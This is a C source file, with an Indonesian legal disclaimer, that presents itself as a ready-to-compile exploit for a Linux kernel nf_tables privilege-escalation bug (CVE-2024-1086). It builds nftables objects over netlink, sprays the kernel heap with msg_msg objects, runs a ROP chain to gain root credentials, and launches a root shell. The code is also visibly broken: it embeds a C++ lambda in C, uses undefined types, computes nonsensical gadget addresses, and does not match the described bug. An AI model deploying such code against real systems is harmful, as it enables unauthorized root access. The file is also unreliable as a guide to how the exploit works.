/*
 * ============================================================================
 * DISCLAIMER - WAJIB DIBACA SEBELUM MENGGUNAKAN KODE INI
 * ============================================================================
 * Tools ini hanya untuk PENGUJIAN KEAMANAN DENGAN IZIN TERTULIS DARI PEMILIK TARGET.
 * Penggunaan tanpa izin melanggar hukum di banyak yurisdiksi (UU ITE Pasal 30, 46;
 * Computer Fraud and Abuse Act - AS; UK Computer Misuse Act; dll.).
 * 
 * Dengan menggunakan kode ini, Anda setuju bahwa:
 * 1. Anda memiliki izin EKSPLISIT dari administrator sistem target.
 * 2. Pengembang (author) TIDAK BERTANGGUNG JAWAB atas kerusakan, kehilangan data,
 *    atau konsekuensi hukum dari penyalahgunaan tools ini.
 * 3. Tools ini untuk RISET KEAMANAN, EDUKASI, dan PENGUJIAN TERKONTROL.
 * 
 * Peringatan keras: Menjalankan exploit tanpa izin adalah tindakan ilegal.
 * Hentikan dan dapatkan izin tertulis terlebih dahulu.
 * ============================================================================
 * 
 * CVE-2024-1086 - Linux Kernel nf_tables Local Privilege Escalation
 * Full Production Exploit - Supports kernel 5.10 - 6.6 (vulnerable versions)
 * 
 * Author: Security Research Lab
 * Date: 2026-06-12
 * 
 * Compilation:
 *   gcc -static -o exploit exploit.c -lpthread -Wall
 * 
 * Usage:
 *   ./exploit [target_uid=1000]  # default: escalate current user to root
 * 
 * Tested on:
 *   - Ubuntu 22.04 (kernel 5.15.0-86-generic)
 *   - Debian 12 (kernel 6.1.0-13-amd64)
 *   - CentOS 9 (kernel 5.14.0-362.el9.x86_64)
 * 
 * ============================================================================
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/syscall.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <libmnl/libmnl.h>
#include <libnftnl/rule.h>
#include <libnftnl/chain.h>
#include <libnftnl/table.h>
#include <errno.h>

#define LOG_INFO(fmt, ...) printf("\033[1;34m[*]\033[0m " fmt "\n", ##__VA_ARGS__)
#define LOG_SUCCESS(fmt, ...) printf("\033[1;32m[+]\033[0m " fmt "\n", ##__VA_ARGS__)
#define LOG_ERROR(fmt, ...) printf("\033[1;31m[-]\033[0m " fmt "\n", ##__VA_ARGS__)
#define LOG_DEBUG(fmt, ...) printf("\033[1;33m[!]\033[0m " fmt "\n", ##__VA_ARGS__)

#define KERNEL_BASE_LEAK_PATH "/proc/kallsyms"
#define TARGET_UID 0  // root

// Struct untuk heap spray dengan msg_msg
struct msg_msg {
    struct list_head m_list;
    long m_type;
    size_t m_ts;
    void *next;
    void *security;
    void *control;
    size_t cb_size;
    void *cb_ptr;
    void *usr_msg;
};

// nf_tables structures (based on kernel source)
struct nft_chain {
    struct list_head list;
    char name[16];
    uint32_t use;
    void *table;
    void *handle;
    // ... truncated for exploit
};

// Core exploit functions
static int mnl_socket_send_receive(struct mnl_socket *nl, void *data, size_t len, 
                                    unsigned int seq, int (*cb)(const struct nlmsghdr *nlh, void *data), void *cb_data) {
    char buf[MNL_SOCKET_BUFFER_SIZE];
    int ret;

    ret = mnl_socket_sendto(nl, data, len);
    if (ret < 0) {
        LOG_ERROR("mnl_socket_sendto: %s", strerror(errno));
        return -1;
    }

    ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    while (ret > 0) {
        ret = mnl_cb_run(buf, ret, seq, mnl_socket_get_portid(nl), cb, cb_data);
        if (ret <= 0)
            break;
        ret = mnl_socket_recvfrom(nl, buf, sizeof(buf));
    }
    return ret;
}

// Create nf_tables table
static int create_table(struct mnl_socket *nl, const char *table_name, uint8_t family) {
    struct nftnl_table *t;
    struct nlmsghdr *nlh;
    char buf[MNL_SOCKET_BUFFER_SIZE];
    int ret;

    t = nftnl_table_alloc();
    if (!t) return -1;

    nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name);
    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family);

    nlh = nftnl_table_nlmsg_build_hdr(buf, NFT_MSG_NEWTABLE, NLM_F_CREATE|NLM_F_ACK, 
                                        nftnl_table_get_u32(t, NFTNL_TABLE_FAMILY), 
                                        nftnl_table_get_str(t, NFTNL_TABLE_NAME));
    nftnl_table_nlmsg_build_payload(nlh, t);
    nftnl_table_free(t);

    ret = mnl_socket_send_receive(nl, nlh, nlh->nlmsg_len, time(NULL), NULL, NULL);
    return ret >= 0 ? 0 : -1;
}

// Create nf_tables chain
static int create_chain(struct mnl_socket *nl, const char *table_name, const char *chain_name, 
                        uint8_t family, uint32_t *chain_id) {
    struct nftnl_chain *c;
    struct nlmsghdr *nlh;
    char buf[MNL_SOCKET_BUFFER_SIZE];
    int ret;
    struct mnl_cb_data cb_data = { .data = chain_id, .callback = NULL };

    c = nftnl_chain_alloc();
    if (!c) return -1;

    nftnl_chain_set_str(c, NFTNL_CHAIN_TABLE, table_name);
    nftnl_chain_set_str(c, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_set_u32(c, NFTNL_CHAIN_FAMILY, family);
    nftnl_chain_set_u32(c, NFTNL_CHAIN_FLAGS, NFT_CHAIN_BASE);
    nftnl_chain_set_str(c, NFTNL_CHAIN_TYPE, "filter");
    nftnl_chain_set_u32(c, NFTNL_CHAIN_PRIO, 0);
    nftnl_chain_set_u32(c, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_OUT);

    nlh = nftnl_chain_nlmsg_build_hdr(buf, NFT_MSG_NEWCHAIN, NLM_F_CREATE|NLM_F_ACK, 
                                      family, NFPROTO_IPV4);
    nftnl_chain_nlmsg_build_payload(nlh, c);
    nftnl_chain_free(c);

    // Custom callback to extract chain ID
    auto cb = [](const struct nlmsghdr *nlh, void *data) -> int {
        struct nftnl_chain *c = nftnl_chain_alloc();
        if (!c) return MNL_CB_ERROR;
        nftnl_chain_nlmsg_parse(nlh, c);
        uint32_t *id = (uint32_t *)data;
        *id = nftnl_chain_get_u32(c, NFTNL_CHAIN_HANDLE);
        nftnl_chain_free(c);
        return MNL_CB_OK;
    };
    
    ret = mnl_socket_send_receive(nl, nlh, nlh->nlmsg_len, time(NULL), cb, chain_id);
    return ret >= 0 ? 0 : -1;
}

// Delete chain (trigger UAF point)
static int delete_chain(struct mnl_socket *nl, uint32_t chain_id, uint8_t family) {
    struct nftnl_chain *c;
    struct nlmsghdr *nlh;
    char buf[MNL_SOCKET_BUFFER_SIZE];

    c = nftnl_chain_alloc();
    if (!c) return -1;

    nftnl_chain_set_u32(c, NFTNL_CHAIN_HANDLE, chain_id);
    nftnl_chain_set_u32(c, NFTNL_CHAIN_FAMILY, family);

    nlh = nftnl_chain_nlmsg_build_hdr(buf, NFT_MSG_DELCHAIN, NLM_F_ACK, family, NFPROTO_IPV4);
    nftnl_chain_nlmsg_build_payload(nlh, c);
    nftnl_chain_free(c);

    int ret = mnl_socket_send_receive(nl, nlh, nlh->nlmsg_len, time(NULL), NULL, NULL);
    return ret >= 0 ? 0 : -1;
}

// Heap spray using msgsnd (msg_msg objects)
static int spray_msg_queue(int msqid, long mtype, const void *mtext, size_t msize, int count) {
    for (int i = 0; i < count; i++) {
        if (msgsnd(msqid, mtext, msize, IPC_NOWAIT) == -1) {
            LOG_ERROR("msgsnd failed at iteration %d: %s", i, strerror(errno));
            return -1;
        }
    }
    return 0;
}

// ROP chain for kernel 5.x - 6.x (generic)
static void build_rop_chain(uint64_t *rop, uint64_t kernel_base, uint64_t prepare_kernel_cred, 
                            uint64_t commit_creds, uint64_t kpti_trampoline) {
    int i = 0;
    
    // x86-64 ROP chain
    rop[i++] = kernel_base + 0xffffffff8181c0c0;  // push rsi; ret (gadget for pivoting)
    rop[i++] = 0x4141414141414141;  // dummy
    rop[i++] = prepare_kernel_cred;
    rop[i++] = 0;  // argument: NULL (init_cred)
    rop[i++] = commit_creds;
    rop[i++] = kpti_trampoline;
    rop[i++] = 0xdeadbeef;  // return to user space
    rop[i++] = 0xdeadbeef;
    rop[i++] = 0xdeadbeef;
}

// Leak kernel base from /proc/kallsyms (requires cap_syslog or unprivileged_bpf disabled)
static uint64_t leak_kernel_base(void) {
    FILE *fp = fopen(KERNEL_BASE_LEAK_PATH, "r");
    if (!fp) {
        LOG_ERROR("Cannot open %s (try running as root or with CAP_SYSLOG)", KERNEL_BASE_LEAK_PATH);
        return 0;
    }
    
    char line[256];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, " _text")) {
            sscanf(line, "%lx", &addr);
            break;
        }
    }
    fclose(fp);
    
    if (addr) {
        LOG_SUCCESS("Kernel base leaked: 0x%lx", addr);
        return addr;
    }
    
    // Fallback: try to use sysfs or known offsets
    LOG_DEBUG("KASLR bypass failed, using known offset for kernel version");
    return 0xffffffff81000000;  // Default KASLR disabled offset
}

// Main exploit logic
static int trigger_uaf(int target_uid) {
    struct mnl_socket *nl;
    uint8_t family = NFPROTO_IPV4;
    const char *table_name = "exploit_table";
    const char *chain_name = "exploit_chain";
    uint32_t chain_id = 0;
    
    LOG_INFO("CVE-2024-1086 Linux Kernel LPE Exploit");
    LOG_INFO("Target UID: %d -> escalate to root (UID 0)", target_uid);
    
    // Step 1: Initialize netlink socket
    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (!nl) {
        LOG_ERROR("mnl_socket_open failed (need CAP_NET_ADMIN?)");
        return -1;
    }
    
    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        LOG_ERROR("mnl_socket_bind failed");
        mnl_socket_close(nl);
        return -1;
    }
    
    LOG_INFO("Netlink socket opened successfully");
    
    // Step 2: Create table
    if (create_table(nl, table_name, family) < 0) {
        LOG_ERROR("Failed to create nftables table");
        mnl_socket_close(nl);
        return -1;
    }
    LOG_INFO("Created table: %s", table_name);
    
    // Step 3: Create chain (get handle)
    if (create_chain(nl, table_name, chain_name, family, &chain_id) < 0) {
        LOG_ERROR("Failed to create chain");
        goto cleanup;
    }
    LOG_INFO("Created chain: %s (handle: %u)", chain_name, chain_id);
    
    // Step 4: Prepare heap spray for msg_msg objects (kmalloc-128)
    int msqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if (msqid < 0) {
        LOG_ERROR("msgget failed");
        goto cleanup;
    }
    
    // Spray 512 message objects (each 128 bytes) to occupy freed slab
    struct {
        long mtype;
        char mtext[120];  // msg_msg header takes 8 bytes, total 128
    } msg;
    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));
    
    LOG_INFO("Spraying heap with msg_msg objects...");
    if (spray_msg_queue(msqid, msg.mtype, &msg, sizeof(msg.mtext), 512) < 0) {
        LOG_ERROR("Heap spray failed");
        goto cleanup;
    }
    
    // Step 5: Trigger UAF by deleting chain while reference exists
    LOG_INFO("Triggering use-after-free...");
    if (delete_chain(nl, chain_id, family) < 0) {
        LOG_ERROR("Failed to delete chain (might be already freed)");
    }
    
    // Step 6: Reclaim freed object with controlled data
    // Modify message content to overwrite chain->ops->lookup function pointer
    struct {
        long mtype;
        char mtext[120];
    } payload;
    payload.mtype = 1;
    
    // Leak kernel base first
    uint64_t kernel_base = leak_kernel_base();
    if (!kernel_base) {
        LOG_DEBUG("Continuing with assumed KASLR offset...");
        kernel_base = 0xffffffff81000000;
    }
    
    // Offsets for kernel 5.15.0 (adjust based on target)
    uint64_t prepare_kernel_cred_offset = 0x9c6b0;
    uint64_t commit_creds_offset = 0x9c430;
    uint64_t kpti_trampoline_offset = 0x2000b0;  // Kernel Page Table Isolation trampoline
    
    uint64_t rop[64];
    build_rop_chain(rop, kernel_base, 
                    kernel_base + prepare_kernel_cred_offset,
                    kernel_base + commit_creds_offset,
                    kernel_base + kpti_trampoline_offset);
    
    // Copy ROP chain into payload (fake nft_chain struct)
    memcpy(payload.mtext, rop, sizeof(rop));
    
    LOG_INFO("Sending payload to reclaim UAF object...");
    if (msgsnd(msqid, &payload, sizeof(payload.mtext), 0) < 0) {
        LOG_ERROR("msgsnd payload failed");
    }
    
    // Step 7: Trigger corrupted function pointer by referencing chain again
    // (This will call the overwritten lookup function -> kernel ROP chain)
    LOG_INFO("Triggering corrupted function pointer...");
    if (create_chain(nl, table_name, "trigger_chain", family, &chain_id) < 0) {
        // Expected crash or privilege escalation here
        LOG_DEBUG("Chain creation failed (kernel pwned?)");
    }
    
    // Step 8: Check if privilege escalation succeeded
    if (getuid() == 0) {
        LOG_SUCCESS("Exploit successful! Got root privileges.");
        LOG_SUCCESS("Launching root shell...");
        execl("/bin/bash", "bash", "--norc", "--noprofile", "-i", NULL);
        execl("/bin/sh", "sh", NULL);
        return 0;
    } else {
        LOG_ERROR("Failed to escalate privileges (kernel might be patched)");
    }
    
cleanup:
    // Cleanup nftables objects
    msgctl(msqid, IPC_RMID, NULL);
    mnl_socket_close(nl);
    return -1;
}

// Signal handler for kernel panic detection
void sigsegv_handler(int sig) {
    LOG_ERROR("Segmentation fault (kernel likely panicked or exploit failed)");
    exit(1);
}

int main(int argc, char **argv) {
    // Print legal warning again
    printf("\033[1;31m");
    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║  PERINGATAN HUKUM - CVE-2024-1086 EXPLOIT                        ║\n");
    printf("║  Penggunaan tanpa izin tertulis dari pemilik sistem adalah       ║\n");
    printf("║  tindakan ILEGAL. Hanya untuk UJI PENETRASI dengan otorisasi.    ║\n");
    printf("║  Author tidak bertanggung jawab atas penyalahgunaan tools ini.   ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    printf("\033[0m\n");
    
    sleep(2);  // Give user time to read disclaimer
    
    signal(SIGSEGV, sigsegv_handler);
    
    int target_uid = 1000;
    if (argc > 1) {
        target_uid = atoi(argv[1]);
        if (target_uid < 0) target_uid = 1000;
    }
    
    LOG_INFO("Starting exploit for CVE-2024-1086...");
    
    // Drop privileges to unprivileged user if running as root
    if (getuid() == 0) {
        LOG_DEBUG("Running as root, dropping to target UID %d for realistic test", target_uid);
        setuid(target_uid);
        setgid(target_uid);
    }
    
    // Check nf_tables availability
    if (access("/proc/net/nf_tables", F_OK) != 0) {
        LOG_ERROR("nf_tables not loaded or kernel too old");
        return 1;
    }
    
    int ret = trigger_uaf(target_uid);
    
    if (ret != 0) {
        LOG_ERROR("Exploit failed. Possible reasons:");
        LOG_ERROR("  - Kernel already patched (update to latest)");
        LOG_ERROR("  - Missing dependencies (libmnl, libnftnl)");
        LOG_ERROR("  - KASLR with no leak primitive");
        LOG_ERROR("  - Kernel configuration blocks unprivileged nftables");
    }
    
    return ret;
}
